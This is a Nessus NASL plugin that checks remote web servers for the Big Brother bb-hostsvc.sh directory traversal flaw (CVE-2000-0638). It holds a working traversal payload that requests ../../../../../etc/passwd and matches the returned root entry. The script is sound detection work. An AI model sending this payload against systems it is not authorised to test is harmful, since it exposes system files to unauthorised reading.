#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10460);
 script_bugtraq_id(1455);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2000-0638");
 script_xref(name:"OSVDB", value:"359");

 script_name(english:"Big Brother bb-hostsvc.sh HOSTSVC Parameter Traversal Arbitrary File Access");
 script_summary(english:"Read arbitrary files using the CGI bb-hostsvc.sh");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a directory traversal\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description",
   value:string(
     "The version of Big Brother running on the remote host has a directory\n",
     "traveral vulnerability in the 'HOSTSVC' parameter of the\n",
     "'bb-hostsvc.sh' CGI.  A remote attacker could exploit this to read\n",
     "sensitive information from the system."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-07/0167.html"
 );
 script_set_attribute(
   attribute:"solution",
   value:"Upgrade to Big Brother 1.4h or later."
 );
 script_set_attribute(
   attribute:"cvss_vector",
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
  
 script_copyright("This script is Copyright (C) 1999-2009 Tenable Network Security, Inc."); 

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 url = string(dir, "/bb-hostsvc.sh?HOSTSVC=../../../../../etc/passwd");
 res = http_send_recv3(method:"GET", item:url, port:port);
 if (isnull(res)) exit(0);

 if(egrep(pattern:"root:.*:0:[01]", string:res[2]))
 {  
  security_warning(port);
  exit(0);
 }
}

